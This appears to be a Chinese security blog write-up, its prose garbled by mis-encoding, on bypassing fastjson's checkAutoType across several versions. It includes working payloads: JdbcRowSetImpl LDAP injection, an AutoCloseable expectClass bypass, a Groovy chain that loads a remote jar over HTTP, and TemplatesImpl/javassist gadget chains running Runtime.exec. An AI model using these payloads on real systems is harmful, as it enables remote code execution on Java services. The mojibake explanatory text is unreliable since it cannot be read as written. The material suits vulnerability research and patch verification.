java.lang.Class, val: com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl , b: @type: com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl, _bytecodes: [å­—èŠ‚ç ], _name: a.b, _tfactory: , _outputProperties: , _name: b, _version: 1.0, allowedProtocols: all ç”±äºè¯¥ç±»ä¼ å…¥çš„å‚æ•°å¥½å‡ ä¸ªéƒ½æ²¡æœ‰å¯¹åº”çš„getterå’Œsetteræ–¹æ³•ï¼Œæ‰€ä»¥è¦åˆ©ç”¨å®ƒçš„è¯éœ€è¦æ”¹é…ç½® JSON.parseObject(s, Feature.SupportNonPublicField); fastjsoné«˜ç‰ˆæœ¬ç»•è¿‡fastjson1.2.47ç»•è¿‡ä¾èµ– dependency groupIdcom.alibaba/groupId artifactIdfastjson/artifactId version1.2.25/version/dependency æˆ‘ä»¬ç”¨ä¸Šä¹‹å‰çš„payloadæ¥è¿è¡Œçš„è¯ä¾¿ä¼šç›´æ¥æŠ¥é”™å¦‚ä¸‹ï¼š æˆ‘ä»¬åœ¨æœ€åä¸€è¡Œæ‰“ä¸ªæ–­ç‚¹è°ƒè¯•ä¸€ä¸‹ å‘ç°æ˜¯åœ¨åˆ¤æ–­keyå€¼æ˜¯å¦ä¸º@typeä¹‹ååšäº†ä¸€ä¸ªcheckAutoTypeçš„æ ¡éªŒ æˆ‘ä»¬è·Ÿè¿›è¿™ä¸ªå‡½æ•°çœ‹ä¸€çœ‹ï¼Œä¸€ç›´å¾€ä¸‹èµ°ï¼Œä¼šå…ˆä»ä¸¤ä¸ªç¼“å­˜ï¼ˆMappingå’Œdeserializersï¼‰ä¸­è¿›è¡ŒåŠ è½½ Class? clazz = TypeUtils.getClassFromMapping(typeName);if (clazz == null) clazz = deserializers.findClass(typeName); ç°åœ¨è‚¯å®šæ˜¯æ²¡æœ‰çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ç»§ç»­å¾€ä¸‹èµ°ï¼Œä¼šç›´æ¥è¢«é»‘åå•æ‹¦æˆª é»‘åå•å¦‚ä¸‹ï¼š ä»å¤´çœ‹è¯¥å‡½æ•°ï¼Œåªæœ‰é€šè¿‡äº†é»‘ç™½åå•çš„æ ¡éªŒåæ‰èƒ½ç»§ç»­åˆ°ç±»åŠ è½½ ç™½åå•é»˜è®¤æ˜¯ç©ºçš„ï¼Œæ‰€ä»¥æ˜¾ç„¶èµ°ä¸åˆ°è¿™é‡Œçš„ç±»åŠ è½½ æˆ‘ä»¬å†å¾€ä¸‹çœ‹çœ‹åˆ«çš„èƒ½ç±»åŠ è½½çš„ä»£ç  è¿™æ˜¯ä»ç¼“å­˜ä¸­çš„æŒ‡å®šç±»ä¸­è·å– å¦‚æœç¼“å­˜ä¸­æ²¡æœ‰çš„è¯ï¼Œä¼šç»§ç»­ä»ååºåˆ—åŒ–å™¨ä¸­æ‰¾ è¿›æ¥çœ‹äº†ä¸‹ï¼Œä¹Ÿæ˜¯ä»deserializerç¼“å­˜ä¸­åŠ è½½ç±» å¯ä»¥çœ‹éƒ½æ˜¯ä»ç¼“å­˜ä¸­æ¥åŠ è½½ç±»ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æ˜¯è¦çœ‹çœ‹èƒ½ä¸èƒ½å‘ç¼“å­˜ç±»ä¸­æ·»åŠ ä¸€äº›æˆ‘ä»¬çš„æ¶æ„ç±»æ¥è¿›è¡Œç»•è¿‡ æŸ¥æ‰¾å¯¹mappingè¿›è¡Œputæ“ä½œçš„éƒ¨åˆ†ï¼Œæ¥åˆ°TypeUtilçš„loadClass()æ–¹æ³• äºæ˜¯æˆ‘ä»¬æŸ¥æ‰¾è¯¥loadClass()çš„ç”¨æ³• åœ¨TypeUtilæœ¬ç±»ä¸­çš„ç”¨æ³•å½“ç„¶æ˜¯æ´¾ä¸ä¸Šç”¨åœºçš„ åœ¨checkAutoType()å‡½æ•°ä¸­è°ƒç”¨ï¼Œä½†æ˜¯å—é™äºifï¼Œéƒ½èµ°ä¸è¿›å» ç„¶åå°±æ˜¯MiscCodecä¸­çš„deserialize()ä¸­ï¼Œå½“clazzä¸ºClass.classçš„æ—¶å€™ï¼Œä¼šå°†strValæ”¾å…¥loadClassä¸­ è¯¥éƒ¨åˆ†ä½äºdeserializer()æ–¹æ³•ä¸­ï¼Œè¯´æ˜è¿™ä¸œè¥¿å’Œååºåˆ—åŒ–æœ‰å…³ æ³¨æ„MiscCodecå®ç°äº†ObjectSerializerå’ŒObjectDeserializeræ¥å£ï¼Œæ‰€ä»¥è¿™ç©æ„æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªåºåˆ—åŒ–å™¨ååºåˆ—åŒ–å™¨ ä¸Šæ–‡æåˆ°è¿‡ååºåˆ—åŒ–å™¨æ˜¯ä»configä¸­è·å–åˆ°çš„ï¼Œè¿™ä¸ªconfigæˆ‘ä»¬ä¸Šæ–‡å·®ä¸å¤šåˆ†æè¿‡äº†ï¼Œèµ°è¿›å»åº•å±‚å®é™…ä¸Šæ˜¯åœ¨deserializerç¼“å­˜é‡Œæ‰¾classå¯¹åº”çš„é”®å€¼å¯¹ å¦‚æœæˆ‘ä»¬ååºåˆ—åŒ–çš„ç±»æ˜¯Classï¼Œé‚£ä¹ˆå°±ä¼šè°ƒç”¨MiscCodecçš„ååºåˆ—åŒ–å™¨ æ‰€ä»¥åœ¨ååºåˆ—åŒ–çš„æ—¶å€™èµ°åˆ°deserializer()ä¸­å°±ä¼šè°ƒç”¨MiscCodecçš„loadClass()ï¼Œç„¶åå°±ä¼šæŠŠæˆ‘ä»¬ä¼ å…¥çš„å­—ç¬¦ä¸²ä¼ ç»™loadClass() å› æ­¤ä¸€å…±æ˜¯åˆ†ä¸ºä¸¤æ­¥ï¼Œç¬¬ä¸€æ­¥æ˜¯å…ˆå°†æˆ‘ä»¬çš„æ¶æ„ç±»åŠ è½½åˆ°ç¼“å­˜ä¸­ï¼Œç¬¬äºŒéƒ¨æ˜¯ä»ç¼“å­˜ä¸­æŸ¥æ‰¾æˆ‘ä»¬çš„æ¶æ„ç±»ï¼Œä»è€Œç»•è¿‡checkAutoTypeå‡½æ•° payloadï¼š package org.example;import com.alibaba.fastjson.JSON;public class FastJsonBypass1 public static void main(String[] args) throws Exception //ç¬¬ä¸€æ­¥ï¼Œååºåˆ—åŒ–ä¸€ä¸ªClassç±»ï¼Œå€¼ä¸ºæ¶æ„ç±» //æ¥ç€ç”¨ä¹‹å‰çš„payload String s = \\@type\\:\\java.lang.Class\\,\\val\\:\\com.sun.rowset.JdbcRowSetImpl\\,\\@type\\:\\com.sun.rowset.JdbcRowSetImpl\\,\\DataSourceName\\:\\ldap://localhost:10389/cn=test,dc=example,dc=com\\,\\AutoCommit\\:false; JSON.parseObject(s); è‡³äºä¸ºä»€ä¹ˆå‚æ•°åè¦æ˜¯valï¼Œè§ä¸‹å›¾ å½“ç¬¬äºŒæ¬¡ç»è¿‡è¯¥å‡½æ•°çš„æ—¶å€™ï¼Œå¯ä»¥ç›´æ¥ä»ç¼“å­˜ä¸­åŠ è½½com.sun.rowset.JdbcRowSetImplï¼Œä»è€Œç»•è¿‡æ£€æµ‹ é¢˜å¤–è¯ï¼š å®é™…ä½¿ç”¨fastjson1.2.47èµ°åˆ°checkAutoTypeçš„æ—¶å€™ä¼šå‘ç°å’Œ1.2.25æ˜¯ä¸ä¸€æ ·çš„ åŸå…ˆçš„denyListsé»‘åå•å˜æˆäº†ä¸€ä¸ªå“ˆå¸Œè¡¨ï¼Œä¸»æ‰“çš„å°±æ˜¯ä¸€ä¸ªé˜²æ­¢å®‰å…¨äººå‘˜ç ”ç©¶è¿™ç©æ„æ¥è¿›è¡Œç»•è¿‡ï¼Œï¼Œ ä½†æ˜¯åœ¨è¿™ä¸ªç‰ˆæœ¬è¿˜æ˜¯æ²¡é˜²ä½é€šè¿‡å‘mappingsæ·»åŠ ç±»åæ¥è¾¾åˆ°ç±»åŠ è½½çš„ç»•è¿‡ å·²ç ´è§£å¼€çš„é»‘åå•å“ˆå¸Œå¦‚ä¸‹ï¼šhttps://github.com/LeadroyaL/fastjson-blacklist fastjson1.2.68åœ¨1.2.68ç‰ˆæœ¬ç”¨ä¸Šä»¥å‰çš„payloadç›´æ¥æŠ¥é”™ï¼Œè°ƒè¯•ä¸€ä¸‹çœ‹çœ‹æ˜¯å“ªé‡Œå‡ºäº†é—®é¢˜ å½“èµ°åˆ°MiscCodec.deserialize()ä¸­è§¦å‘TypeUtils.loadClass()çš„åœ°æ–¹åŠ å…¥äº†ä¸€ä¸ªcacheå‚æ•°ï¼Œé»˜è®¤ä¸ºfalse è·Ÿè¿›loadClassæ–¹æ³•ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥æ˜ç™½åªæœ‰å½“cacheå€¼ä¸ºtrueçš„æ—¶å€™ï¼Œæ‰ä¼šå‘ç¼“å­˜ä¸­putä¸€ä¸ªæ–°çš„ç±» ç°åœ¨è¯´æ˜è¿™ä¸ªæ–¹æ³•æ˜¯è¡Œä¸é€šçš„äº†ï¼Œéœ€è¦æˆ‘ä»¬å¦å¯»ä»–æ³• æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹é€šè¿‡checkAutoType()æ ¡éªŒçš„æ–¹å¼æœ‰å“ªäº›ï¼š ç™½åå•é‡Œçš„ç±» å¼€å¯äº†autotype ä½¿ç”¨äº†JSONTypeæ³¨è§£ æŒ‡å®šäº†æœŸæœ›ç±»ï¼ˆexpectClassï¼‰ ç¼“å­˜åœ¨mappingä¸­çš„ç±» ä½¿ç”¨ParserConfig.AutoTypeCheckHandleræ¥å£é€šè¿‡æ ¡éªŒçš„ç±» æˆ‘ä»¬è¿™æ¬¡ç”¨çš„å°±æ˜¯ç¬¬å››ç§æ–¹å¼ checkAutoType()ä¸­çš„expectClasså‚æ•°ç±»å‹ä¸ºjava.lang.Classï¼Œå½“expectClassä¼ å…¥checkAutoType()æ—¶ä¸ä¸ºnullï¼Œå¹¶ä¸”æˆ‘ä»¬è¦å®ä¾‹åŒ–çš„ç±»æ˜¯expectClassçš„å­ç±»æˆ–å…¶å®ç°æ—¶ä¼šå°†ä¼ å…¥çš„ç±»è§†ä¸ºä¸€ä¸ªåˆæ³•çš„ç±»ï¼ˆä¸èƒ½åœ¨é»‘åå•ä¸­ï¼‰ï¼Œç„¶åé€šè¿‡loadClassè¿”å›è¯¥ç±»çš„classï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªç»•è¿‡checkAutoType()ã€‚ æ­¤å¤–ï¼Œç”±äºcheckAutoType()ä¸­é»‘åå•çš„æ£€æµ‹ä½äºloadClassä¹‹å‰ï¼Œæ‰€ä»¥ä¸èƒ½åœ¨é»‘åå•ä¸­ï¼Œå¦å¤–æ¶æ„ç±»éœ€è¦æ˜¯expectClassçš„æ¥å£æˆ–æ˜¯expectClassçš„å­ç±»ã€‚ æˆ‘ä»¬æŸ¥æ‰¾æŠŠexpectClasså‚æ•°ä¼ é€’ç»™checkAutoType()å‡½æ•°çš„åˆ©ç”¨ç±»æœ‰ä¸¤ä¸ªï¼šAutoCloseableç±»å’ŒThrowableç±» AutoCloseableå…ˆå‡†å¤‡å¥½æˆ‘ä»¬éœ€è¦çš„ä»£ç  EXP package org.example;import com.alibaba.fastjson.JSON;public class AutoCloseableBypass public static void main(String[] args) JSON.parseObject(\\@type\\:\\java.lang.AutoCloseable\\, \\@type\\:\\org.example.JavaBean\\, \\cmd\\:\\calc.exe\\); JavaBean package org.example;import java.io.IOException;public class JavaBean implements AutoCloseable public JavaBean(String cmd) try Runtime.getRuntime().exec(cmd); catch (IOException e) e.printStackTrace(); @Override public void close() throws Exception æµ‹è¯•ä¹‹åæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ï¼Œä¸‹é¢æˆ‘ä»¬æ¥è‡ªå·±è¿›è¡Œè°ƒè¯•çœ‹ä¸€ä¸‹å…·ä½“çš„è¿‡ç¨‹ å‰é¢æˆ‘ä»¬è¿˜æ˜¯æ­¥å…¥chechAutotype()æ–¹æ³•ï¼Œé‡Œé¢æœ‰ä¸€æ®µä»£ç æ˜¯å½“expectClassä¸ä¸ºç©ºä¸”ä¸æ˜¯é‚£å‡ ä¸ªå›ºå®šçš„ç±»çš„æ—¶å€™ä¼šå°†expectClassFlagè®¾ä¸ºtrueï¼Œæˆ‘ä»¬åœ¨ç¬¬äºŒæ¬¡è¿›å…¥checkAutotype()æ–¹æ³•çš„æ—¶å€™ä¼šç”¨åˆ° æ¥ä¸‹æ¥ä¼šè¿›è¡Œé»‘ç™½åå•æŸ¥è¯¢ã€‚é¦–å…ˆè¿›è¡Œå†…éƒ¨ç™½åå•ï¼Œä¹‹ååŠè¿›è¡Œå†…éƒ¨é»‘åå•ï¼Œç”±äºå†…éƒ¨é»‘åå•ä¸ºnullæ•…è·³è¿‡ ä¹‹åï¼Œå¦‚æœéå†…éƒ¨ç™½åå•å¹¶ä¸”å¼€å¯autoTypeSupportæˆ–è€…expectClassFlagå€¼ä¸ºtrueæ—¶ä¼šè¿›è¡Œé»‘ç™½åå•æŸ¥æ‰¾ã€‚é¦–å…ˆåœ¨ç™½åå•å†…äºŒåˆ†æŸ¥æ‰¾ï¼Œå¦‚æœåœ¨åˆ™åŠ è½½åè¿”å›æŒ‡å®šclasså¯¹è±¡ï¼Œå¦‚æœä¸åœ¨æˆ–è€…ä¸ºç©ºï¼Œä¼šç»§ç»­åœ¨é»‘åå•ä¸­è¿›è¡ŒäºŒåˆ†æŸ¥æ‰¾ï¼›è‹¥ä¸åœ¨é»‘åå•ä¸”getClassFromMappingè¿”å›å€¼ä¸ºnullï¼Œå°±å†åœ¨ç™½åå•æŸ¥è¯¢ï¼Œè‹¥ä¸ºç©ºåˆ™å¼‚å¸¸ï¼Œå¦åˆ™continue ä¸€ç›´å¾€ä¸‹èµ°ï¼Œæœ€åè¿”å›æ¥å£AutoCloseableï¼Œä»è¯¥æ–¹æ³•å‡ºå» å‡ºæ¥ä¸€ç›´å¾€ä¸‹èµ°åˆ°è¿™é‡Œï¼Œè·Ÿè¿›å» ä¸€ç›´å¾€ä¸‹èµ°ï¼Œåœ¨deserialze()è§£æå­—æ®µï¼Œå½“key@typeï¼ˆç¬¬äºŒä¸ªï¼‰æ—¶ï¼Œè°ƒç”¨checkAutoType()å¹¶ä¼ å…¥expectClass ç¬¬äºŒæ¬¡æ­¥å…¥checkAutoTypeæ–¹æ³•ï¼Œè¿™æ¬¡å‚æ•°typeNmeçš„å€¼ä¸ºorg.example.JavaBeanï¼Œå¹¶ä¸”è¿™ä¸€æ¬¡æˆåŠŸå°†expectClassFlagèµ‹å€¼ä¸ºtrue ç»§ç»­å¾€ä¸‹èµ°ï¼Œè¿™æ¬¡ä¼šè¿›å…¥é»‘ç™½åå•æ£€æµ‹ ç»è¿‡è¿™æ¬¡æ£€æµ‹åï¼Œä¸‹é¢ç”±äºautoTypeSupportå€¼ä¸ºfalseï¼Œæ‰€ä»¥è¦å†æ¥ä¸€æ¬¡é»‘ç™½åå•æ£€æµ‹ ä¹‹åresourceå°†â€œ.â€æ›¿æ¢ä¸ºâ€â€œå¾—åˆ°è·¯å¾„ï¼Œå¹¶ä¸”è¿™é‡Œè²Œä¼¼æœ‰è¯»æ–‡ä»¶çš„åŠŸèƒ½ ä¹‹åå¦‚æœautoTypeæ‰“å¼€æˆ–è€…ä½¿ç”¨äº†JSONTypeæ³¨è§£ï¼Œåˆæˆ–è€… expectClassFlagä¸ºtrueæ—¶ï¼Œå¹¶ä¸”åªæœ‰åœ¨autoTypeæ‰“å¼€æˆ–è€…ä½¿ç”¨äº†JSONTypeæ³¨è§£æ—¶ï¼Œæ‰ä¼šå°†ç±»åŠ å…¥åˆ°ç¼“å­˜mappingä¸­ã€‚å¦å¤–æ²¡ä½¿ç”¨JSONTypeæ³¨è§£ä¸ä¼šè¿”å› ç»§ç»­å¾€ä¸‹èµ°ï¼Œä½†expectClassä¸ä¸ºç©ºçš„æ—¶å€™ï¼Œä¼šå°†ç±»åŠ å…¥ç¼“å­˜åå¹¶è¿”å› å‡ºæ¥åå¾€ä¸‹èµ°åˆ°deserialzeæ–¹æ³•ï¼Œç”±äºå°†æ¶æ„ç±»åŠ å…¥mappingï¼Œåœ¨ååºåˆ—åŒ–è§£ææ—¶ä¼šç»•è¿‡autoTypeï¼ŒæˆåŠŸåˆ©ç”¨ è·Ÿè¿›è¯¥æ–¹æ³•çš„è¯ï¼Œä¸€ç›´å¾€ä¸‹èµ°åˆ°ç”Ÿæˆæ–°çš„å¯¹è±¡çš„æ—¶å€™ä¼šå¼¹è®¡ç®—å™¨ fastjson1.2.80groovyåœ¨fastjsonçš„1.2.80ç‰ˆæœ¬ä¸­å¯ä»¥é€šè¿‡å°†ä¾èµ–åŠ å…¥åˆ°java.lang.Exception æœŸæœ›ç±»çš„å­ç±»ä¸­ï¼Œç»•è¿‡checkAutoType æµ‹è¯•ä»£ç  package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;public class Poc public static void main(String[] args) String json = + \\@type\\:\\java.lang.Exception\\, + \\@type\\:\\org.codehaus.groovy.control.CompilationFailedException\\, + \\unit\\: + + ; try JSON.parse(json); catch (Exception e) æŒ‰ä¹‹å‰è°ƒè¯•æ­¥éª¤èµ°ï¼Œè·Ÿè¿›checkAutoTypeå‡½æ•°ä¸­ï¼Œä»ç¼“å­˜ä¸­è¯»å–åˆ°äº†Expectionç±» è¿”å›ï¼Œå¾€ä¸‹èµ°ï¼Œè·å–ObjectDeserializerå¯¹è±¡ï¼Œå› ä¸ºæ˜¯å¼‚å¸¸ç±»ï¼Œè·å–åˆ°çš„æ˜¯ThrowableDeserializerååºåˆ—åŒ–å™¨ æ­¥å…¥è¿›deserialzeæ–¹æ³•ï¼Œè·³è½¬åˆ°comalibabafastjsonparserParserConfig.javaï¼ˆåœ¨ä¸‹é¢ç”ŸæˆexClassçš„æ—¶å€™è·³è½¬çš„ï¼‰ å¾€ä¸‹èµ°ï¼Œä¼šè¿›è¡Œé»‘ç™½åå•éªŒè¯ï¼Œä¸é‡è¦ï¼Œç»§ç»­å¾€ä¸‹èµ°åˆ° è·Ÿè¿›loadClassæ–¹æ³•ï¼Œå¯ä»¥åŠ è½½å¤„ç±»ï¼Œä½†ç”±äºcacheå€¼ä¸ä¸ºçœŸæ‰€ä»¥ä¸èƒ½putè¿›ç¼“å­˜ä¸­ï¼Œæ‰€ä»¥returnå›å» ç»§ç»­å¾€ä¸‹èµ°ï¼Œç”±äºexpectClassä¸ä¸ºç©ºï¼Œæ‰€ä»¥å¯ä»¥å°†clazzåŠ å…¥ç¼“å­˜ä¸­ è¿”å›åï¼Œå›åˆ°äº†comalibabafastjsonparserdeserializerThrowableDeserializer.javaï¼Œç»§ç»­å¾€ä¸‹èµ° è·Ÿè¿›getDeserializeræ–¹æ³•ï¼Œå¾€ä¸‹èµ°ï¼Œæ¯ä¸€æ¬¡éƒ½ä¼šputDeserializerï¼Œå¯ä»¥å‘deserializersæ·»åŠ æ–°æ•°æ® ç¬¬ä¸‰æ¬¡å¤„ç†ä¼šåŠ ä¸Šorg.codehaus.groovy.control.ProcessingUnit éœ€è¦å­˜åœ¨groovyé“¾ï¼Œè¿™é‡Œæµ‹è¯•ç‰ˆæœ¬ä½¿ç”¨å¦‚ä¸‹ç‰ˆæœ¬ dependency groupIdorg.codehaus.groovy/groupId artifactIdgroovy-all/artifactId version3.0.1/version/dependency jaråŒ…ç”¨çš„ https://github.com/Lonely-night/fastjsonVul 1.ç¼–è¯‘attack æ¨¡å—ä¸º attack-1.jaråŒ… 2.åœ¨attack-1.jaråŒ…æ‰€åœ¨çš„ç›®å½•ä¸‹æ‰§è¡Œå¯ç”¨httpæœåŠ¡ã€‚ python -m http.server 8433 Poc package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;public class Poc public static void main(String[] args) String json = + \\@type\\:\\java.lang.Exception\\, + \\@type\\:\\org.codehaus.groovy.control.CompilationFailedException\\, + \\unit\\: + + ; try JSON.parse(json); catch (Exception e) json = + \\@type\\:\\org.codehaus.groovy.control.ProcessingUnit\\, + \\@type\\:\\org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\\, + \\config\\: + \\@type\\: \\org.codehaus.groovy.control.CompilerConfiguration\\, + \\classpathList\\:[\\http://127.0.0.1:8433/attack-1.jar\\] + , + \\gcl\\:null, + \\destDir\\: \\/tmp\\ + ; JSONObject.parse(json); åŸºäºjavaåŸç”Ÿååºåˆ—åŒ–fastjson1.2.48fastjson2å…·ä½“çš„è¯·å‚è€ƒåŸä½œè€…åšå®¢æ–‡ç«  ä¾èµ– groupIdorg.javassist/groupId artifactIdjavassist/artifactId version3.19.0-GA/version/dependencydependency groupIdcom.alibaba/groupId artifactIdfastjson/artifactId version1.2.48/version/dependency çœ‹ä¸‹æ¥åˆ©ç”¨é“¾å…¶å®ä¸éš¾ï¼šJSONArray.toString()-JSONArray.toJSONString()-getter payloadï¼š package org.example;import com.alibaba.fastjson.JSONArray;import javax.management.BadAttributeValueExpException;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;public class Test public static void setValue(Object obj, String name, Object value) throws Exception Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj, value); public static void main(String[] args) throws Exception ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.makeClass(a); CtClass superClass = pool.get(AbstractTranslet.class.getName()); clazz.setSuperclass(superClass); CtConstructor constructor = new CtConstructor(new CtClass[], clazz); constructor.setBody(Runtime.getRuntime().exec(\\calc\\);); clazz.addConstructor(constructor); byte[][] bytes = new byte[][]clazz.toBytecode(); TemplatesImpl templates = TemplatesImpl.class.newInstance(); setValue(templates, _bytecodes, bytes); setValue(templates, _name, sherlock); setValue(templates, _tfactory, null); JSONArray jsonArray = new JSONArray(); jsonArray.add(templates); BadAttributeValueExpException val = new BadAttributeValueExpException(null); Field valfield = val.getClass().getDeclaredField(val); valfield.setAccessible(true); valfield.set(val, jsonArray); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr); objectOutputStream.writeObject(val); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); è‡³äºä¸ºä»€ä¹ˆåœ¨1.2.49å¼€å§‹è¯¥ç§æ“ä½œå°±ä¸è¡Œäº†å‘¢ï¼Œè¿™æ˜¯å› ä¸ºä»è¿™ä¸ªç‰ˆæœ¬å¼€å§‹JSONArrayä»¥åŠJSONObjectæ–¹æ³•å¼€å§‹çœŸæ­£æœ‰äº†è‡ªå·±çš„readObjectæ–¹æ³• åœ¨å…¶SecureObjectInputStreamç±»å½“ä¸­é‡å†™äº†resolveClass,åœ¨å…¶ä¸­è°ƒç”¨äº†checkAutoTypeæ–¹æ³•åšç±»çš„æ£€æŸ¥ fastjson1é€šæ€é‚£ä¹ˆä¸Šé¢çš„é™åˆ¶æˆ‘ä»¬è¦æ€ä¹ˆçªç ´å‘¢ è§åŸä½œè€…åšå®¢ ä¾èµ– dependency groupIdcom.alibaba/groupId artifactIdfastjson/artifactId version1.2.83/version/dependencydependency groupIdorg.javassist/groupId artifactIdjavassist/artifactId version3.27.0-GA/version/dependency ä»ä¸Šæ–‡æˆ‘ä»¬å¯çŸ¥ï¼Œåœ¨å…¶SecureObjectInputStreamç±»å½“ä¸­é‡å†™äº†resolveClass,é€šè¿‡è°ƒç”¨äº†checkAutoTypeæ–¹æ³•åšç±»çš„æ£€æŸ¥ï¼Œè¿™æ ·çœŸçš„æ˜¯å®‰å…¨çš„ä¹ˆï¼Ÿ åˆçœ‹ï¼Œè¿™æ ·çš„å†™æ³•å¾ˆå®‰å…¨ï¼Œå½“è°ƒç”¨JSONArrayJSONObjectçš„Objectæ–¹æ³•è§¦å‘ååºåˆ—åŒ–æ—¶ï¼Œå°†è¿™ä¸ªååºåˆ—åŒ–è¿‡ç¨‹å§”æ‰˜ç»™SecureObjectInputStreamå¤„ç†æ—¶ï¼Œè§¦å‘resolveClasså®ç°å¯¹æ¶æ„ç±»çš„æ‹¦æˆª å› æ­¤æˆ‘ä»¬å°±éœ€è¦æ‰¾æ‰¾çœ‹åœ¨å“ªäº›æƒ…å†µä¸‹readObjectçš„æ—¶å€™ä¸ä¼šè°ƒç”¨resolveClassï¼Œç­”æ¡ˆå°±æ˜¯å¼•ç”¨ï¼ˆå…·ä½“åˆ†æçœ‹å¼•ç”¨åŸæ–‡ï¼‰ é‚£ä¹ˆç°åœ¨è¦è§£å†³çš„å°±æ˜¯å¦‚ä½•åœ¨JSONArrayJSONObjectå¯¹è±¡ååºåˆ—åŒ–æ¢å¤å¯¹è±¡æ—¶ï¼Œè®©æˆ‘ä»¬çš„æ¶æ„ç±»æˆä¸ºå¼•ç”¨ç±»å‹ä»è€Œç»•è¿‡resolveClassçš„æ£€æŸ¥ ç­”æ¡ˆæ˜¯å½“å‘Listã€setã€mapç±»å‹ä¸­æ·»åŠ åŒæ ·å¯¹è±¡æ—¶å³å¯æˆåŠŸåˆ©ç”¨ï¼Œè¿™é‡Œä¹Ÿç®€å•æä¸€ä¸‹ï¼Œè¿™é‡Œä»¥Listä¸ºä¾‹ï¼Œ ArrayListObject arrayList = new ArrayList();arrayList.add(templates);arrayList.add(templates);writeObjects(arrayList); åœ¨java.io.ObjectOutputStream#writeObject0æ–¹æ³•ä¸­å­˜åœ¨ä¸€ä¸ªåˆ¤æ–­ï¼Œå½“å†æ¬¡å†™å…¥åŒä¸€å¯¹è±¡æ—¶ï¼Œå¦‚æœåœ¨handlesè¿™ä¸ªå“ˆå¸Œè¡¨ä¸­æŸ¥åˆ°äº†æ˜ å°„ï¼Œå°±ä¼šé€šè¿‡writeHandleæ–¹æ³•å°†é‡å¤å¯¹è±¡ä»¥REFERENCEç±»å‹å†™å…¥ï¼Œå› æ­¤å‘Listã€SetåŠMapç±»å‹ä¸­æ·»åŠ åŒæ ·å¯¹è±¡æ—¶å³å¯æˆåŠŸåˆ©ç”¨ åºåˆ—åŒ–æ—¶ï¼Œå…ˆå°†templatesåŠ å…¥ArrayListï¼Œåç»­åœ¨JSONArrayä¸­å†æ¬¡åºåˆ—åŒ–TemplatesImplæ—¶ï¼Œç”±äºåœ¨handlesè¿™ä¸ªå“ˆå¸Œè¡¨ä¸­æŸ¥åˆ°äº†æ˜ å°„ï¼Œåç»­åˆ™ä¼šä»¥å¼•ç”¨å½¢å¼è¾“å‡ºã€‚ååºåˆ—åŒ–æ—¶ï¼ŒArrayListå…ˆé€šè¿‡readObjectæ¢å¤TemplatesImplå¯¹è±¡ï¼Œä¹‹åæ¢å¤BadAttributeValueExpExceptionå¯¹è±¡ï¼Œåœ¨æ¢å¤è¿‡ç¨‹ä¸­ï¼Œç”±äºBadAttributeValueExpExceptionè¦æ¢å¤valå¯¹åº”çš„JSONArrayJSONObjectå¯¹è±¡ï¼Œä¼šè§¦å‘JSONArrayJSONObjectçš„readObjectæ–¹æ³•ï¼Œå°†è¿™ä¸ªè¿‡ç¨‹å§”æ‰˜ç»™SecureObjectInputStreamï¼Œåœ¨æ¢å¤JSONArrayJSONObjectä¸­çš„TemplatesImplå¯¹è±¡æ—¶ï¼Œç”±äºæ­¤æ—¶çš„ç¬¬äºŒä¸ªTemplatesImplå¯¹è±¡æ˜¯å¼•ç”¨ç±»å‹ï¼Œé€šè¿‡readHandleæ¢å¤å¯¹è±¡çš„é€”ä¸­ä¸ä¼šè§¦å‘resolveClassï¼Œç”±æ­¤å®ç°äº†ç»•è¿‡ payloadï¼š package org.example;import com.alibaba.fastjson.JSONArray;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;public class Main public static void setValue(Object obj, String name, Object value) throws Exception Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj, value); public static byte[] genPayload(String cmd) throws Exception ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.makeClass(a); CtClass superClass = pool.get(AbstractTranslet.class.getName()); clazz.setSuperclass(superClass); CtConstructor constructor = new CtConstructor(new CtClass[], clazz); constructor.setBody(Runtime.getRuntime().exec(\\+cmd+\\);); clazz.addConstructor(constructor); clazz.getClassFile().setMajorVersion(49); return clazz.toBytecode(); public static void main(String[] args) throws Exception TemplatesImpl templates = TemplatesImpl.class.newInstance(); setValue(templates, _bytecodes, new byte[][]genPayload(calc)); setValue(templates, _name, sherlock); setValue(templates, _tfactory, null); JSONArray jsonArray = new JSONArray(); jsonArray.add(templates); BadAttributeValueExpException bd = new BadAttributeValueExpException(null); setValue(bd,val,jsonArray); HashMap hashMap = new HashMap(); hashMap.put(templates,bd); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(hashMap); objectOutputStream.close(); ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray())); objectInputStream.readObject(); 